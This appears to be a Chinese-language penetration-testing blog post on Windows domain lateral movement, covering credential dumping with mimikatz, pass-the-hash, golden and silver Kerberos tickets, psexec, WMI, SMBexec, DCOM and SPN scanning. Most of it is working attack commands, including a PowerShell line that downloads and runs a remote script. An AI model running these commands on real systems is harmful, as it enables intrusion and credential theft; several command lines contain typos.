+<h4 id="使用mimikatz在线读取SAM文件"><a href="#使用mimikatz在线读取SAM文件" class="headerlink" title="使用mimikatz在线读取SAM文件"></a>使用mimikatz在线读取SAM文件</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimkatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用mimikatz离线读取lsass-dmp文件"><a href="#使用mimikatz离线读取lsass-dmp文件" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件"></a>使用mimikatz离线读取lsass.dmp文件</h4><p>lsass.exe进程：Local Security Authority Service、本地安全权限服务，用于本地安全和登录策略</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 使用微软官方提供的工具procdump导出lsass.dmp文件</span><br><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"># 使用mimikatz导出lsass.dmp文件中的密码散列值，如果出现switch to minidump表示加载成功</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"># 导出密码<span class="title">hash</span>值</span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">dull</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用Powershell进行hash-dump"><a href="#使用Powershell进行hash-dump" class="headerlink" title="使用Powershell进行hash dump"></a>使用Powershell进行hash dump</h4><p>Nishang的Get-PassHashes.ps1可以导出hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 以管理员权限打开powershell，进入Nishang目录</span><br><span class="line">Import-Module .\Get-PassHashes.ps1</span><br><span class="line">Get-PassHashes</span><br><span class="line"># 通过远程加载来执行</span><br><span class="line">powershell iex (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.15.216:8888&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用MSF进行hash-dump"><a href="#使用MSF进行hash-dump" class="headerlink" title="使用MSF进行hash dump"></a>使用MSF进行hash dump</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">run hashdump</span><br><span class="line">run post/windows/gather/smart_hashdump</span><br><span class="line"><span class="comment"># 除了meterpreter自带的，还可以通过加载mimikatz获得：</span></span><br><span class="line">load mimikatz（必须，否则无以下命令）</span><br><span class="line">msv</span><br><span class="line">tspkg</span><br><span class="line">wdigest</span><br><span class="line">kerberos</span><br><span class="line">ssp</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、哈希传递-Pass-the-Hash，PTH"><a href="#三、哈希传递-Pass-the-Hash，PTH" class="headerlink" title="三、哈希传递(Pass-the-Hash，PTH)"></a>三、哈希传递(Pass-the-Hash，PTH)</h3><p>从Windows Vista和Windows Server 2008版本开始，系统默认禁用LM HASH，因为在使用NTLM HASH进行身份认证时，不会使用明文密码，而是将明文密码通过系统API转化成HASH在进行对比认证，因此攻击者在获得密码哈希时就可以利用哈希传递来通过认证。</p>
+<h4 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h4><p>适用Windwos Server 2012 R2及之后的版本，因为默认内存不会记录明文密码；</p>
+<p>拿到HASH不容易破解明文密码；</p>
+<p>域内主机管理员用户名密码统一使用。</p>
+<h4 id="使用NTLM-HASH进行哈希传递"><a href="#使用NTLM-HASH进行哈希传递" class="headerlink" title="使用NTLM HASH进行哈希传递"></a>使用NTLM HASH进行哈希传递</h4><p>如果已经获取到目标的用户名及NTLM HASH值，可以管理员身份运行以下命令进行hash传递。</p>
+<p>可以用mimikatz进行hash传递</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "privilege::debug" "sekurlsa::pth" /user:administrator /domain:de1ay.com /ntlm:<span class="number">1</span>d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"># 获取后可以获取目录</span><br><span class="line"><span class="built_in">dir</span> \\dc\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210205110806741.png" alt="image-20210205110806741"></p>
+<p>也可以用msf进行hash传递</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.15.181</span><br><span class="line"><span class="built_in">set</span> smbuser rabbitmask</span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用ASE-256密钥进行哈希传递"><a href="#使用ASE-256密钥进行哈希传递" class="headerlink" title="使用ASE-256密钥进行哈希传递"></a>使用ASE-256密钥进行哈希传递</h4><p>也可以使用mimikatz利用ASE-256密钥进行哈希传递，前提是本地安装了补丁KB2871997（但是如果安装了该补丁，会导致管理员权限无法使用PsExec、WMI、smbexec、schtasks、at，也无法使用远程主机的共享文件）</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "priviledeg::debug" "sekurlsa::pth" /user:administrator /domain:de1ay.com /aes256:<span class="number">5</span>d37c27c9a06abee82a5aea3cf662834fd4318ad</span><br><span class="line"># 获取后可以获取DC(主机名)目录</span><br><span class="line"><span class="built_in">dir</span> \\dc\c$</span><br></pre></td></tr></table></figure>
+
+<p>另外还有一点需要注意：更新该补丁后，发现无法使用常规的hash传递方法横向移动，但是administrator除外（SID是500），使用该账号仍然可以进行hash传递。</p>
+<h3 id="四、票据传递（Pass-the-Ticket，PTT）"><a href="#四、票据传递（Pass-the-Ticket，PTT）" class="headerlink" title="四、票据传递（Pass-the-Ticket，PTT）"></a>四、票据传递（Pass-the-Ticket，PTT）</h3><p>Kerberos协议主要用于计算机网络的身份鉴别(Authentication), 其特点是用户只需输入一次身份验证信息就可以凭借此验证获得的票据(ticket-granting ticket)访问多个服务，即SSO(Single Sign On)。由于在每个Client和Service 之间建立了共享密钥，使得该协议具有一定的安全性。Active Directory 域服务是域或林中的默认 Kerberos 实现所必需的。</p>
+<p>Kerberos认证流程：</p>
+<p><img src="/imgs/image-20210205151001780.png" alt="image-20210205151001780"></p>
+<ol>
+<li>使用用户的NTLM哈希和时间戳一起加密，将加密的结果发送到KDC进行身份验证的票据请求 (AS REQ) ；</li>
+<li>域控(KDC)检查用户信息(登录限制, 组成员等) 并创建票证授权票证(TGT),，将TGT加密、签名并返回给用户(AS REP)，只有域中的Kerberos服务(kbrtgt)才能打开和读取TGT数据 ；</li>
+<li>用户请求票证授权服务票证时(TGS REQ)，会将 TGT发送给DC，DC打开TGT并验证PAC校验和，验证通过之后,，复制TGT中的数据用于创建TGS票证；</li>
+<li>使用目标服务账户的NTLM哈希对TGS进行加密，并将加密结果发送给用户(TGS REP) ；</li>
+<li>用户连接到服务器托管的服务端口上发送TGS给 服务器(AP REQ)，被托管的服务使用服务账户的哈希打开票证；</li>
+<li>如果客户端需要进行相互间的身份验证就会执行这一步。</li>
+</ol>
+<p>伪造TGT-黄金票据；伪造TGS-&gt;白银票据。</p>
+<h4 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h4><p>参考链接：<a href="https://mp.weixin.qq.com/s/45pfuc31uQEnZRUPG0_-yw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/45pfuc31uQEnZRUPG0_-yw</a></p>
+<p>黄金票据的原理就是用krbtgt的hash来伪造TGT的内容。更改里面的client参数与session key等。让TGS以为我就是那个我所声称的人，一般声称administrator。所谓的黄金票据其实就是kerberos认证的第二个阶段中的tgs的ticket也就是TGT。这个ticket相当于对请求端的一个身份认证的凭据，如果可以伪造这个ticket，那么就可以伪造任意身份，而黄金票据就是一个实现方式。</p>
+<h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><ol>
+<li>krbtgt的hash</li>
+<li>本地管理员权限</li>
+<li>域的sid（普通用户的sid除去最后三位就是域的sid）</li>
+<li>域内任意用户的本地管理员权限</li>
+</ol>
+<h5 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 清空已有票据</span><br><span class="line"><span class="function">kerberos::<span class="title">purge</span></span></span><br><span class="line"><span class="function"># 制作黄金票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">user:Administrator</span> /<span class="title">domain:test</span>.<span class="title">com</span> /<span class="title">sid:S</span>-1-5-21-3763276348-88739081-2848684050 /<span class="title">krbtgt:d8d2ad72a119a8d418703f7a16580af6</span> /<span class="title">ticket</span>:1.<span class="title">kirbi</span></span></span><br><span class="line"><span class="function"># 加载黄金票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">ptt</span> 1.<span class="title">kirbi</span></span></span><br><span class="line"><span class="function"># 检测成果</span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:test</span>.<span class="title">com</span> /<span class="title">user:krbtgt</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="伪造白银票据："><a href="#伪造白银票据：" class="headerlink" title="伪造白银票据："></a>伪造白银票据：</h4><p>参考链接：<a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/" target="_blank" rel="noopener">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p>
+<ul>
+<li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li>
+<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着<strong>白银票据仅限于特定服务器上的任何服务</strong>。</li>
+<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
+<li>攻击者需要服务帐户密码哈希值</li>
+<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过</li>
+<li>任何事件日志都在目标服务器上。</li>
+</ul>
+<h5 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h5><ol>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>域中的Server服务器账户的NTLM-Hash</li>
+<li>伪造的用户名，可以是任意用户名</li>
+<li>目标服务器上面的kerberos服务</li>
+</ol>
+<h5 id="可利用的服务列表："><a href="#可利用的服务列表：" class="headerlink" title="可利用的服务列表："></a>可利用的服务列表：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote Server    RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 通过mimikatz查看当前域账号administrator的HASH值</span><br><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "<span class="keyword">exit</span>" &gt; <span class="number">1</span>.txt</span><br><span class="line"><span class="function">sekurlsa::<span class="title">logonpasswords</span></span></span><br><span class="line"><span class="function"># 使用<span class="title">mimikatz</span>生成银票</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain</span>:0<span class="title">day.org</span> /<span class="title">sid:S</span>-1-5-21-1812960810-2335050734-3517558805 /<span class="title">target:OWA2010SP3</span>.0<span class="title">day.org</span> /<span class="title">service:cifs</span> /<span class="title">rc4</span>:125445<span class="title">ed1d553393cce9585e64e3fa07</span> /<span class="title">user:silver</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"># 参数说明</span></span><br><span class="line"><span class="function">/<span class="title">domain</span>：当前域名称</span></span><br><span class="line"><span class="function">/<span class="title">sid</span>：<span class="title">SID</span>值，和金票一样取前面一部分</span></span><br><span class="line"><span class="function">/<span class="title">target</span>：目标主机，这里是<span class="title">OWA2010SP3</span>.0<span class="title">day.org</span></span></span><br><span class="line"><span class="function">/<span class="title">service</span>：服务名称，这里需要访问共享文件，所以是<span class="title">cifs</span></span></span><br><span class="line"><span class="function">/<span class="title">rc4</span>：目标主机的<span class="title">HASH</span>值，<span class="title">NTLM</span> <span class="title">hash</span>值</span></span><br><span class="line"><span class="function">/<span class="title">user</span>：伪造的用户名</span></span><br><span class="line"><span class="function">/<span class="title">ptt</span>：表示的是<span class="title">Pass</span> <span class="title">TheTicket</span>攻击，是把生成的票据导入内存，也可以使用/<span class="title">ticket</span>导出之后再使用<span class="title">kerberos</span>::<span class="title">ptt</span>来导入</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="五、PsExec"><a href="#五、PsExec" class="headerlink" title="五、PsExec"></a>五、PsExec</h3><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">PsExec</a>起初被用于大批量Windiows主机的运维，是微软提供的工具，尤其在域环境下的应用，后来被攻击者广泛使用。通过psexec可以在远程目标执行命令并且可以提权到system，其原理是通过IPC管道在远程目标机器创建一个psexec服务，并在本地磁盘中生成一个名为psexesvc的二进制文件，然后通过服务运行命令并在运行结束后删除服务。</p>
+<h4 id="使用注意："><a href="#使用注意：" class="headerlink" title="使用注意："></a>使用注意：</h4><ol>
+<li>使用psexec时要保证远程目标开启了admin$共享（net share admin$）</li>
+<li>在使用ipc$连接后无需在输入账密</li>
+<li>使用psexec执行命令会创建服务，执行完成被自动删除，会产生大量日志</li>
+<li>使用psexec可以获取system权限的交互式shell</li>
+<li>随着应用广泛，越来越多的反病毒厂商开始将其加入黑名单</li>
+</ol>
+<h4 id="使用方法：-1"><a href="#使用方法：-1" class="headerlink" title="使用方法："></a>使用方法：</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取system权限的交互shell，前提是获取了一个ipc$管道；-accepteula使用该参数不会弹出确认框、-s获取system权限</span><br><span class="line">psexec.exe -accepteula \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> -s <span class="built_in">cmd</span>.exe</span><br><span class="line"># 未建立ipc$管道，可以使用账密连接</span><br><span class="line">psexec \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> -u domain\administrator -p passwd <span class="built_in">cmd</span>.exe</span><br><span class="line">psexec \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> -u domain\administrator -p passwd <span class="built_in">cmd</span>.exe /c "<span class="built_in">ipconfig</span>"</span><br></pre></td></tr></table></figure>
+
+<h4 id="msf的psexec模块"><a href="#msf的psexec模块" class="headerlink" title="msf的psexec模块"></a>msf的psexec模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br><span class="line">exploit/windows/smb/psexec_psh <span class="comment">#psexec的powershell版本</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="六、WMI"><a href="#六、WMI" class="headerlink" title="六、WMI"></a>六、WMI</h3><p>WMI（Windows Management Instrumentation）由一系列工具组成，可以在本地或者远程管理计算机。随着psexec在内网中被严格监控，攻击者开始逐渐用wmi在内网进行横向移动，使用wmi操作不会产生日志，相对来说隐蔽性更好。（使用过程中发现火绒会告警）</p>
+<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 基本命令：执行远程命令</span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> /user:administrator /password:password process <span class="keyword">call</span> create "<span class="built_in">cmd</span>.exe /c <span class="built_in">ipconfig</span> &gt; ip.txt"</span><br><span class="line"></span><br><span class="line"># impacket工具包中的wmiexec。python环境安装impacket</span><br><span class="line">wmiexec.py administrator:password@<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">120</span></span><br><span class="line"></span><br><span class="line"># wmiexec.vbs脚本通过VBS调用WMI来模拟psexec</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell <span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> administrator password ["<span class="built_in">ipconfig</span>"]</span><br><span class="line"></span><br><span class="line"># 另外还有PowerSploit自带的Invoke-WmiCommand.ps1脚本和Powershell自带的Invoke-WMIMethod也可以使用</span><br></pre></td></tr></table></figure>
+
+<h3 id="七、SMBexec"><a href="#七、SMBexec" class="headerlink" title="七、SMBexec"></a>七、SMBexec</h3><p>smbexec通过文件共享（admin$、C$、IPC$、D$）在远程目标执行命令。</p>
+<p>C++版本下载地址：<a href="https://github.com/sunorr/smbexec" target="_blank" rel="noopener">https://github.com/sunorr/smbexec</a></p>
+<p>python版本-impacket工具包的smbexec.py</p>
+<p>可以使用impacket的exec版本：<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<p><img src="/imgs/image-20210220101907726.png" alt="image-20210220101907726"></p>
+<p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -h</span><br><span class="line">python smbexec.py domain/administrator:password@192.168.111.130</span><br></pre></td></tr></table></figure>
+
+<p>Linux跨Windows执行命令</p>
+<p>下载链接：<a href="https://github.com/brav0hax/smbexec" target="_blank" rel="noopener">https://github.com/brav0hax/smbexec</a></p>
+<p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载安装</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/brav0hax/smbexec.git</span><br><span class="line"><span class="built_in">cd</span> smbexec</span><br><span class="line">chmod u+x install.sh &amp;&amp; bash install.sh</span><br><span class="line"><span class="comment"># 功能</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="八、DCOM在远程系统中的使用"><a href="#八、DCOM在远程系统中的使用" class="headerlink" title="八、DCOM在远程系统中的使用"></a>八、DCOM在远程系统中的使用</h3><p>DCOM（分布式组件对象）是微软的一系列概念和程序接口。通过DCOM客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p>
+<h4 id="使用方法：-2"><a href="#使用方法：-2" class="headerlink" title="使用方法："></a>使用方法：</h4><h5 id="获取DCOM程序列表"><a href="#获取DCOM程序列表" class="headerlink" title="获取DCOM程序列表"></a>获取DCOM程序列表</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># powershell3.0以上版本（Windows Server 2012及以上系统）</span></span><br><span class="line"><span class="built_in">get-ciminstance</span> Win32_DCOMApplication</span><br><span class="line"><span class="comment"># Powershell2.0（win7、Windows Server 2008）</span></span><br><span class="line"><span class="built_in">get-wmiobject</span> <span class="literal">-namespace</span> root\cimv2 <span class="literal">-class</span> win32_domapplication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210220104727240.png" alt="image-20210220104727240"></p>
+<h5 id="使用DCOM执行任意命令"><a href="#使用DCOM执行任意命令" class="headerlink" title="使用DCOM执行任意命令"></a>使用DCOM执行任意命令</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用MMC20.Application接口在本地启动一个管理员权限的powershell</span></span><br><span class="line"><span class="variable">$com</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">"MMC20.Application"</span>,<span class="string">"127.0.0.1"</span>))</span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">'cmd.exe'</span>,<span class="variable">$null</span>,<span class="string">"/c calc.exe"</span>,<span class="string">"Minimized"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210220105510711.png" alt="image-20210220105510711"></p>
+<h5 id="使用DCOM在远程目标执行命令"><a href="#使用DCOM在远程目标执行命令" class="headerlink" title="使用DCOM在远程目标执行命令"></a>使用DCOM在远程目标执行命令</h5><p>目标：192.168.111.80</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、建立ipc$</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">111.80</span> <span class="string">"tst@123"</span> /user:test</span><br><span class="line"><span class="comment"># 2、调用MMC20.Application执行命令</span></span><br><span class="line"><span class="variable">$com</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">"MMC20.Application"</span>,<span class="string">"192.168.111.80"</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">'cmd.exe'</span>,<span class="variable">$null</span>,<span class="string">"/c calc.exe"</span>,<span class="string">"Minimized"</span>)</span><br><span class="line"><span class="comment"># 3、或者调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’执行远程命令</span></span><br><span class="line"><span class="variable">$com</span> = [<span class="type">Type</span>]::GetTypeFromCLSID(<span class="string">'9BA05972-F6A8-11CF-A442-00A0C90A8F39'</span>,<span class="string">"192.168.111.80"</span>)</span><br><span class="line"><span class="variable">$obj</span> = [<span class="type">System.Activator</span>]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$item</span> = <span class="variable">$obj</span>.item()</span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">"cmd.exe"</span>,<span class="string">"/c calc.exe"</span>,<span class="string">"c:windowssystem32"</span>,<span class="variable">$null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="九、SPN在域环境中的应用"><a href="#九、SPN在域环境中的应用" class="headerlink" title="九、SPN在域环境中的应用"></a>九、SPN在域环境中的应用</h3><p>在域环境中运行的大量应用包含各种资源，为资源合理分组、分类和再分配提供了便利，微软给各种资源分配了不同的服务主题名称（Service Principal Name，SPN）。</p>
+<h4 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p>对于域内置帐户默认注册了SPN，非内置帐户需要进行手动注册，并且域环境中的每台服务器都需要在kerberos身份验证中注册SPN，攻击者通过向域控查询请求需要的SPN，便可以知道SPN位置。因此通过SPN扫描就可以获取服务资源所在位置。</p>
+<p>根据之前分析过的Kerberos协议，用户账密登录AD，域控对账密进行验证，验证通过后KDC会将服务授权票据（TGT）发给用户，用户使用TGT 访问资源。举个栗子，用户访问MYSQL服务，先向域控查询SYN为MYSQL的记录，找到记录后服务器与KDC进行通信，将KDC发放的TGT作为身份凭据发送给KDC进行验证，KDC解密验证成功后，由TGS将一张允许访问mysql spn的服务票据和对应spn服务地址发给用户，用户便可以访问MYSQL服务。</p>
+<p><img src="/imgs/image-20210205151001780.png" alt="image-20210205151001780"></p>
+<h5 id="SPN命令格式"><a href="#SPN命令格式" class="headerlink" title="SPN命令格式"></a>SPN命令格式</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SPN = serviceclass "/" hostname [":"port] ["/" servicename]</span><br><span class="line"># 参数说明</span><br><span class="line">serviceclass：服务组件名称</span><br><span class="line">hostname：全限定域名，同时带有计算机名和域名</span><br><span class="line">port：端口</span><br><span class="line">servicename：服务的专有名称（DN）、objectGuid、Internet主机名或者权限定域名</span><br></pre></td></tr></table></figure>
+
+<h5 id="常见SPN服务"><a href="#常见SPN服务" class="headerlink" title="常见SPN服务"></a>常见SPN服务</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># MSSQL服务</span><br><span class="line">MSSQLvc/computer1.domain:<span class="number">1433</span></span><br><span class="line"># Exchange服务</span><br><span class="line">exchangeMDB/EXCAS01.pentest.com</span><br><span class="line"># RDP服务</span><br><span class="line">TEAMSERV/EXCAS01.pentest.com</span><br><span class="line"># WSMan/WinRM/PSRemoting服务</span><br><span class="line">WSMan/EXCAS01.pentest.com</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用powershell进行SPN扫描"><a href="#使用powershell进行SPN扫描" class="headerlink" title="使用powershell进行SPN扫描"></a>使用powershell进行SPN扫描</h5><p><a href="https://github.com/PyroTek3/PowerShell-AD-Recon" target="_blank" rel="noopener">powershell-ad-recon</a>工具包提供了一系列服务与服务登录帐号和运行服务的主机之间的对应关系，这些服务包括但不限于MSSQL、Exchange、RDP、WinRM。</p>
+<p>使用方法</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描MSSQL服务</span></span><br><span class="line"><span class="built_in">import-module</span> .\Discover<span class="literal">-PSMSSQLServers</span>.ps1</span><br><span class="line">Discover<span class="literal">-PSMSSQLServers</span></span><br><span class="line"><span class="comment"># 扫描所有SPN信息</span></span><br><span class="line"><span class="built_in">import-module</span> .\Discover<span class="literal">-PSInterestingServices</span></span><br><span class="line">Discover<span class="literal">-PSInterestingServices</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="使用Windows自带工具列出SPN信息"><a href="#使用Windows自带工具列出SPN信息" class="headerlink" title="使用Windows自带工具列出SPN信息"></a>使用Windows自带工具列出SPN信息</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain -q */*</span><br></pre></td></tr></table></figure>
+
+<h4 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h4><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">Kerberoast</a>是一种针对Kerberos协议的攻击，通过 <strong>爆破TGS-REP</strong> 实现，在TGS_REP的过程中用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为RC4-HMAC，如果获得这个TGS，我们可以尝试穷举口令，模拟加密过程，进行破解。</p>
